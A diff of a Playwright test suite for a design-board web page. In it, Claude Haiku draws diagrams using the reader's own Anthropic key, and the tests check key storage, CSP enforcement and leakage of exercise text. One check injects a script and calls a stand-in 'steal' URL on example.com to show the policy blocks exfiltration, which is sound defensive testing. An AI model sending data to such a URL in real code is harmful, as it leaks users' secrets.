@@ -10,12 +10,15 @@
 import { chromium } from "playwright";
 import assert from "node:assert/strict";
 import { spawn } from "node:child_process";
-import { mkdirSync, mkdtempSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 
 const root = join(dirname(fileURLToPath(import.meta.url)), "../..");
+// Six real answers from claude-haiku-4-5 (2026-09-26), replayed as canned
+// replies so the checks never spend anything or depend on the model's mood.
+const readHaiku = () => JSON.parse(readFileSync(join(root, "site/designboard/test/haiku-drawings.json"), "utf8"));
 const PORT = +(process.env.DESIGNBOARD_PORT || 8932);
 // DESIGNBOARD_SITE=https://guide.soulful-ai.dev runs the same checks against
 // the published site instead of a local build (no server is started).
@@ -43,7 +46,19 @@ try {
   });
   browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || undefined, args: ["--no-sandbox", "--disable-dev-shm-usage"] });
   const context = await browser.newContext({ viewport: { width: 1440, height: 1000 }, deviceScaleFactor: +(process.env.SITE_SCREENSHOT_SCALE || 1) });
+  // Every Content-Security-Policy refusal on the page, from the first byte.
+  await context.addInitScript(() => {
+    window.__csp = [];
+    document.addEventListener("securitypolicyviolation", (e) => window.__csp.push({ directive: e.violatedDirective, blocked: e.blockedURI }));
+  });
   const page = await context.newPage();
+  // Anthropic is answered by whichever check is running, and by nobody
+  // otherwise: an unrouted call is aborted, so no check can reach the real API
+  // by accident. DESIGNBOARD_HAIKU_KEY (below) is the one deliberate exception.
+  let anthropic = null;
+  const sent = [];                                  // every request the page made, for "where did the key go"
+  page.on("request", (r) => sent.push({ url: r.url(), headers: r.headers(), body: r.postData() || "" }));
+  await page.route("https://api.anthropic.com/**", (route) => (anthropic ? anthropic(route) : route.abort()));
   const errors = [];
   page.on("pageerror", (e) => errors.push(e.message));
   page.on("console", (m) => { if (m.type() === "error" && !/favicon|status of 404/.test(m.text())) errors.push(m.text()); });
@@ -64,7 +79,8 @@ try {
       const svg = document.querySelectorAll(".db")[i].querySelector(".db-svg");
       let r = svg.getBoundingClientRect();
       if (r.top < 70 || r.bottom > innerHeight - 10) { scrollBy({ top: r.top - 90, behavior: "instant" }); r = svg.getBoundingClientRect(); }
-      return { x: r.left + (x / 860) * r.width, y: r.top + (y / 540) * r.height };
+      const vb = svg.viewBox.baseVal;             // 860 x 540, or more when a drawing zoomed the board out
+      return { x: r.left + (x / vb.width) * r.width, y: r.top + (y / vb.height) * r.height };
     }, [i, x, y]);
   }
   // A palette tile dragged to a canvas point, both measured after the last scroll.
@@ -488,7 +504,260 @@ try {
     await B(3).locator('[data-act="break"]').click();
   });
 
-  await check("no page errors", async () => { assert.deepEqual(errors, []); });
+  // ----------------------------------------------------- Haiku draws
+  const H = readHaiku();
+  const FAKE_KEY = "sk-ant-api03-" + "k".repeat(93);
+  const answer = (input, extra = {}) => ({ id: "msg_x", type: "message", role: "assistant", model: "claude-haiku-4-5",
+    content: [{ type: "text", text: "HAIKU-SAID-THIS-1234" }, { type: "tool_use", id: "toolu_x", name: "draw", input }],
+    stop_reason: "tool_use", usage: { input_tokens: 4000, output_tokens: 300 }, ...extra });
+  const reply = (body, status = 200, delay = 0) => async (route) => {
+    if (delay) await new Promise((r) => setTimeout(r, delay));
+    await route.fulfill({ status, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify(body) }).catch(() => {});
+  };
+  const bar = (i) => B(i).locator(".db-haiku");
+  const ask = async (i, text) => { await bar(i).locator(".db-haiku-in").fill(text); await bar(i).locator(".db-haiku-in").press("Enter"); };
+  const idle = (i) => page.waitForFunction((i) => !document.querySelectorAll(".db")[i].classList.contains("is-drawing"), i, { timeout: 15000 });
+
+  await check("the board page allows only its own scripts, talks only to itself and Anthropic, and nothing on it is refused", async () => {
+    const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
+    assert.match(policy, /connect-src 'self' https:\/\/api\.anthropic\.com;/);
+    assert.match(policy, /script-src 'self' 'sha256-[^']+' 'sha256-[^']+';/);
+    const scriptSrc = policy.split(";").map((d) => d.trim()).find((d) => d.startsWith("script-src"));
+    assert.doesNotMatch(scriptSrc, /unsafe/, "no inline script runs unless its hash is listed");
+    assert.deepEqual(await page.evaluate(() => window.__csp), [], "the page as built breaks none of its own policy");
+    // And the policy bites: a script added to the page does not run, and a
+    // request anywhere but here and Anthropic is refused.
+    const bite = await page.evaluate(async () => {
+      const s = document.createElement("script"); s.textContent = "window.__ran = 1"; document.body.append(s);
+      let fetched = "sent";
+      try { await fetch("https://example.com/steal?k=1", { mode: "no-cors" }); } catch { fetched = "refused"; }
+      await new Promise((r) => setTimeout(r, 50));
+      return { ran: window.__ran === 1, fetched, violations: window.__csp.map((v) => v.directive) };
+    });
+    assert.equal(bite.ran, false, "an injected inline script ran");
+    assert.equal(bite.fetched, "refused", "a request to another site went out");
+    assert.ok(bite.violations.some((d) => d.startsWith("script-src")) && bite.violations.some((d) => d.startsWith("connect-src")), JSON.stringify(bite.violations));
+    await page.evaluate(() => { window.__csp = []; });
+  });
+
+  await check("Haiku's bar sits under each canvas, and asks for a key before drawing; a claude.ai session is refused by name", async () => {
+    await page.evaluate(() => { sessionStorage.clear(); localStorage.clear(); });
+    await page.reload({ waitUntil: "load" });
+    await page.addStyleTag({ content: ".reading-bar{position:static!important}html{scroll-behavior:auto!important}.read-progress{display:none!important}" });
+    assert.equal(await page.locator(".db-haiku").count(), 4);
+    const stage = await B(1).locator(".db-stage").boundingBox(), row = await bar(1).boundingBox();
+    assert.ok(Math.abs(stage.x - row.x) < 2 && Math.abs(stage.width - row.width) < 2 && row.y >= stage.y + stage.height - 2, "the bar is the canvas's width, under it");
+    anthropic = reply(answer(H["p1-alb-ecs-rds"].input));
+    const before = sent.length;
+    await ask(1, H["p1-alb-ecs-rds"].ask);
+    assert.equal(await bar(1).locator(".db-keypanel").isVisible(), true, "no key: the panel opens");
+    assert.equal(sent.slice(before).filter((r) => r.url.startsWith("https://api.anthropic.com")).length, 0, "nothing is sent without a key");
+    await bar(1).locator(".db-key-in").fill("sk-ant-sid01-" + "s".repeat(90));
+    await bar(1).locator('[data-act="key-save"]').click();
+    assert.match(await bar(1).locator(".db-key-err").innerText(), /claude\.ai login session/);
+    assert.equal(await page.evaluate(() => sessionStorage.getItem("j2s-anthropic-key") || localStorage.getItem("j2s-anthropic-key")), null, "a session token is never stored");
+    await shot(1, "h1-key-panel.png");
+  });
+
+  await check("with a key, Haiku draws what was asked: the key goes only to Anthropic, the drawing lands, and none of Haiku's words do", async () => {
+    const before = sent.length;
+    await bar(1).locator(".db-key-in").fill(FAKE_KEY);
+    await bar(1).locator('[data-act="key-save"]').click();      // saving goes straight on to draw what was typed
+    await idle(1);
+    const s = await state(1);
+    assert.deepEqual(s.nodes.map((n) => n.part).sort(), ["alb", "ecs", "ecs", "rds", "users"]);
+    assert.equal(s.groups.filter((g) => g.part === "az").length, 2);
+    assert.equal(await page.evaluate(() => [sessionStorage.getItem("j2s-anthropic-key"), localStorage.getItem("j2s-anthropic-key")].join("|")), FAKE_KEY + "|", "kept for the tab only");
+    const mine = sent.slice(before);
+    const withKey = mine.filter((r) => JSON.stringify(r).includes(FAKE_KEY.slice(20)));
+    assert.equal(withKey.length, 1, "the key went out once");
+    assert.equal(new URL(withKey[0].url).origin, "https://api.anthropic.com");
+    assert.equal(withKey[0].headers["x-api-key"], FAKE_KEY);
+    assert.equal(withKey[0].headers["anthropic-dangerous-direct-browser-access"], "true");
+    assert.ok(!withKey[0].body.includes(FAKE_KEY.slice(20)), "never in a body");
+    const text = await page.evaluate(() => document.documentElement.outerHTML);
+    assert.ok(!text.includes("HAIKU-SAID-THIS"), "words Haiku sent beside the drawing are never shown");
+    assert.ok(!text.includes(FAKE_KEY.slice(20)), "the key is nowhere in the page");
+    assert.match(await bar(1).locator(".db-said").innerText(), /users hit an ALB/);
+    assert.match(await bar(1).locator(".db-haiku-note").innerText(), /Drawn\./);
+    await shot(1, "h2-drawn.png");
+  });
+
+  await check("the request carries the board and the reader's words, and not one sentence of the exercise", async () => {
+    const req = sent.filter((r) => r.url.startsWith("https://api.anthropic.com")).at(-1);
+    const body = JSON.parse(req.body);
+    assert.equal(body.model, "claude-haiku-4-5");
+    assert.deepEqual(body.tool_choice, { type: "tool", name: "draw" });
+    assert.ok(body.messages[0].content.includes(H["p1-alb-ecs-rds"].ask));
+    // Every exercise on the page, as the page itself carries it: six words in
+    // a row from any of it, anywhere in what was sent, is a leak.
+    // Read from the page as shipped: a mounted board replaces its own data
+    // block, so the live DOM no longer holds it (the first version of this
+    // check found 0 words to look for, and the size guard below said so).
+    const exercises = await page.evaluate(async () => {
+      const doc = new DOMParser().parseFromString(await (await fetch(location.href)).text(), "text/html");
+      return [...doc.querySelectorAll(".designboard script[type='application/json']")].map((s) => s.textContent);
+    });
+    assert.equal(exercises.length, 4);
+    const words = (t) => String(t).toLowerCase().replace(/[^a-z0-9]+/g, " ").trim().split(" ").filter(Boolean);
+    const windows = new Set();
+    for (const raw of exercises) (function walk(v) { if (typeof v === "string") { const w = words(v); for (let i = 0; i + 6 <= w.length; i++) windows.add(w.slice(i, i + 6).join(" ")); } else if (v && typeof v === "object") Object.values(v).forEach(walk); })(JSON.parse(raw));
+    assert.ok(windows.size > 300, `only ${windows.size} windows of exercise text`);
+    const sentWords = words(req.body), sentWindows = new Set();
+    for (let i = 0; i + 6 <= sentWords.length; i++) sentWindows.add(sentWords.slice(i, i + 6).join(" "));
+    assert.deepEqual([...windows].filter((w) => sentWindows.has(w)), []);
+  });
+
+  await check("the checks read Haiku's drawing like any other, and Ctrl+Z puts back the empty board in one step", async () => {
+    await B(1).locator('[data-act="check"]').click();
+    assert.equal(await B(1).locator('.db-check[data-check="spread"] .st-pass').count(), 1, "two ECS copies behind an ALB are two copies");
+    await B(1).locator(".db-stage").focus();
+    await page.keyboard.press("Control+z");
+    assert.equal((await state(1)).nodes.length, 0, "one undo step for the whole drawing");
+    await page.keyboard.press("Control+Shift+z");
+    assert.equal((await state(1)).nodes.length, 5);
+  });
+
+  await check("'i meant a cache, not a database' swaps that one part, keeps its arrows, and moves nothing else", async () => {
+    const before = await state(1);
+    anthropic = reply(answer(H["p2-meant-cache"].input));
+    await ask(1, H["p2-meant-cache"].ask);
+    await idle(1);
+    const after = await state(1);
+    const was = before.nodes.find((n) => n.id === "rds1"), now = after.nodes.find((n) => n.id === "rds1");
+    assert.equal(was.part, "rds"); assert.equal(now.part, "elasticache");
+    for (const n of before.nodes) if (n.id !== "rds1") assert.deepEqual([after.nodes.find((m) => m.id === n.id).x, after.nodes.find((m) => m.id === n.id).y], [n.x, n.y], `${n.id} moved`);
+    assert.deepEqual(after.edges, before.edges);
+    // The earlier ask went with it, so Haiku knew what "a database" meant.
+    const body = JSON.parse(sent.filter((r) => r.url.startsWith("https://api.anthropic.com")).at(-1).body);
+    assert.match(body.messages[0].content, /asked for before[\s\S]*users hit an ALB/);
+    assert.match(body.messages[0].content, /"id":"rds1","part":"rds"/);
+    await shot(1, "h3-edit.png");
+  });
+
+  await check("a key Anthropic refuses is forgotten, said so plainly, and the panel asks again", async () => {
+    anthropic = reply({ type: "error", error: { type: "authentication_error", message: "invalid x-api-key" } }, 401);
+    const before = await state(1);
+    await ask(1, "add a queue");
+    await idle(1);
+    assert.match(await bar(1).locator(".db-haiku-note").innerText(), /did not accept that key/);
+    assert.equal(await bar(1).locator(".db-keypanel").isVisible(), true);
+    assert.equal(await page.evaluate(() => sessionStorage.getItem("j2s-anthropic-key")), null);
+    assert.deepEqual(await state(1), before, "a failed drawing changes nothing");
+    await page.keyboard.press("Escape");
+  });
+
+  await check("Remember keeps the key on this device, Forget clears it from both places", async () => {
+    await bar(1).locator('[data-act="key"]').click();
+    await bar(1).locator(".db-key-in").fill(FAKE_KEY);
+    await bar(1).locator(".db-key-remember").check();
+    await bar(1).locator('[data-act="key-save"]').click();
+    assert.deepEqual(await page.evaluate(() => [sessionStorage.getItem("j2s-anthropic-key"), localStorage.getItem("j2s-anthropic-key")]), [null, FAKE_KEY]);
+    await page.reload({ waitUntil: "load" });
+    assert.equal(await page.evaluate(() => localStorage.getItem("j2s-anthropic-key")), FAKE_KEY, "remembered across a reload");
+    await bar(1).locator('[data-act="key"]').click();
+    await bar(1).locator('[data-act="key-forget"]').click();
+    assert.deepEqual(await page.evaluate(() => [sessionStorage.getItem("j2s-anthropic-key"), localStorage.getItem("j2s-anthropic-key")]), [null, null]);
+    await page.evaluate((k) => sessionStorage.setItem("j2s-anthropic-key", k), FAKE_KEY);
+  });
+
+  await check("Stop ends a drawing that is taking too long, and nothing changes", async () => {
+    await page.addStyleTag({ content: ".reading-bar{position:static!important}html{scroll-behavior:auto!important}.read-progress{display:none!important}" });
+    const before = await state(1);
+    anthropic = reply(answer(H["p3-serverless"].input), 200, 4000);
+    await ask(1, H["p3-serverless"].ask);
+    await page.waitForTimeout(300);
+    assert.equal(await B(1).evaluate((b) => b.classList.contains("is-drawing")), true);
+    assert.equal(await bar(1).locator(".db-haiku-in").isDisabled(), true);
+    await bar(1).locator('[data-act="draw"]').click();                 // it reads Stop now
+    await idle(1);
+    assert.equal(await bar(1).locator(".db-haiku-note").innerText(), "Stopped.");
+    assert.deepEqual(await state(1), before);
+    await page.waitForTimeout(4200);                                    // the answer arrives late, and is ignored
+    assert.deepEqual(await state(1), before);
+  });
+
+  await check("a model that refuses forced tool use is asked again with auto, and still only draws", async () => {
+    let n = 0;
+    anthropic = async (route) => (++n === 1
+      ? reply({ type: "error", error: { type: "invalid_request_error", message: "tool_choice: forced tool use is not supported for this model" } }, 400)(route)
+      : reply(answer(H["p5-mistake"].input))(route));
+    const before = sent.length;
+    await ask(1, H["p5-mistake"].ask);
+    await idle(1);
+    const calls = sent.slice(before).filter((r) => r.url.startsWith("https://api.anthropic.com") && r.body).map((r) => JSON.parse(r.body).tool_choice.type);
+    assert.deepEqual(calls, ["tool", "auto"]);
+    assert.deepEqual((await state(1)).nodes.map((n) => n.part).sort(), ["apigw", "rds", "sqs"], "the queue that writes to Postgres is drawn as said, mistake and all");
+    await B(1).locator('[data-act="check"]').click();
+    assert.equal(await B(1).locator('.db-check[data-check="arrows"] .st-fail').count(), 1, "and the checks, not Haiku, are what say so");
+  });
+
+  await check("a drawing too big for the board zooms it out instead of squeezing it, and still drags where it is dropped", async () => {
+    const before = await state(1), tall = (await B(1).locator(".db-svg").boundingBox()).height;
+    anthropic = reply(answer(H["q5-rename"].input));
+    await ask(1, H["q5-rename"].ask);
+    await idle(1);
+    const s = await state(1);
+    assert.ok(s.canvas && s.canvas.w > 860, JSON.stringify(s.canvas));
+    assert.equal(await B(1).locator(".db-svg").getAttribute("viewBox"), `0 0 ${s.canvas.w} ${s.canvas.h}`);
+    assert.ok(Math.abs((await B(1).locator(".db-svg").boundingBox()).height - tall) < 2, "the board keeps its height on the page");
+    assert.match(await bar(1).locator(".db-haiku-note").innerText(), /zoomed out/);
+    for (const n of s.nodes) assert.ok(n.x > 0 && n.x < s.canvas.w && n.y > 0 && n.y < s.canvas.h, `${n.id} on the canvas`);
+    await shot(1, "h4-zoomed.png");
+    // A drag on the zoomed board lands where the pointer lets go.
+    const n = s.nodes.find((x) => x.part === "cloudfront");
+    const from = await at(1, n.x, n.y), to = await at(1, n.x + 40, n.y + 60);
+    await drag(from, to);
+    const moved = (await state(1)).nodes.find((x) => x.id === n.id);
+    assert.ok(Math.abs(moved.x - (n.x + 40)) <= 4 && Math.abs(moved.y - (n.y + 60)) <= 4, `${JSON.stringify(moved)} vs ${n.x + 40},${n.y + 60}`);
+    await B(1).locator(".db-stage").focus();
+    await page.keyboard.press("Control+z");
+    await page.keyboard.press("Control+z");
+    assert.deepEqual(await state(1), before, "two undos: the drag, then the whole drawing and its zoom");
+    assert.equal(await B(1).locator(".db-svg").getAttribute("viewBox"), "0 0 860 540");
+  });
+
+  await check("the bar steps aside in break it, and comes back", async () => {
+    await B(1).locator('[data-act="break"]').click();
+    assert.equal(await bar(1).isVisible(), false);
+    await B(1).locator('[data-act="break"]').click();
+    assert.equal(await bar(1).isVisible(), true);
+    anthropic = null;
+  });
+
+  // The one check that reaches the real model, and only when asked to:
+  // DESIGNBOARD_HAIKU_KEY=<an Anthropic key> draws for real on whichever site
+  // this runs against. Never in CI; the key is typed into the page like a
+  // reader's, and nothing here writes it anywhere.
+  if (process.env.DESIGNBOARD_HAIKU_KEY) await check("Haiku, for real: a drawing and an edit from the live model", async () => {
+    await page.unroute("https://api.anthropic.com/**");
+    await page.evaluate(() => { sessionStorage.clear(); localStorage.clear(); });
+    await page.reload({ waitUntil: "load" });
+    await page.addStyleTag({ content: ".reading-bar{position:static!important}html{scroll-behavior:auto!important}.read-progress{display:none!important}" });
+    await ask(1, "users hit an ALB in front of two ECS services in two zones, which read an RDS database");
+    await bar(1).locator(".db-key-in").fill(process.env.DESIGNBOARD_HAIKU_KEY);
+    await bar(1).locator('[data-act="key-save"]').click();
+    await idle(1);
+    assert.match(await bar(1).locator(".db-haiku-note").innerText(), /Drawn/, await bar(1).locator(".db-haiku-note").innerText());
+    assert.ok((await state(1)).nodes.some((n) => n.part === "rds"));
+    await shot(1, "live-1-drawn.png");
+    await ask(1, "oh no, i meant a cache, not a database");
+    await idle(1);
+    const s = await state(1);
+    assert.ok(s.nodes.some((n) => n.part === "elasticache") && !s.nodes.some((n) => n.part === "rds"), JSON.stringify(s.nodes.map((n) => n.part)));
+    await shot(1, "live-2-edit.png");
+    assert.deepEqual(await page.evaluate(() => window.__csp), [], "the real call breaks nothing in the policy");
+    await page.evaluate(() => { sessionStorage.clear(); localStorage.clear(); });
+  });
+
+  await check("no page errors, and nothing refused by the page's policy", async () => {
+    // The refusals the checks above provoke on purpose (a 400 and a 401 from
+    // Anthropic, a planted script, a request to another site) are expected;
+    // window.__csp still has to be empty, so a real refusal cannot hide here.
+    const provoked = /api\.anthropic\.com|status of 40[01]\b|^Executing inline script violates|^Fetch API cannot load https:\/\/example\.com\/steal/;
+    assert.deepEqual(errors.filter((e) => !provoked.test(e)), []);
+    assert.deepEqual(await page.evaluate(() => window.__csp), []);
+  });
 
   await check("a phone gets the reference sketches and no board", async () => {
     const phone = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
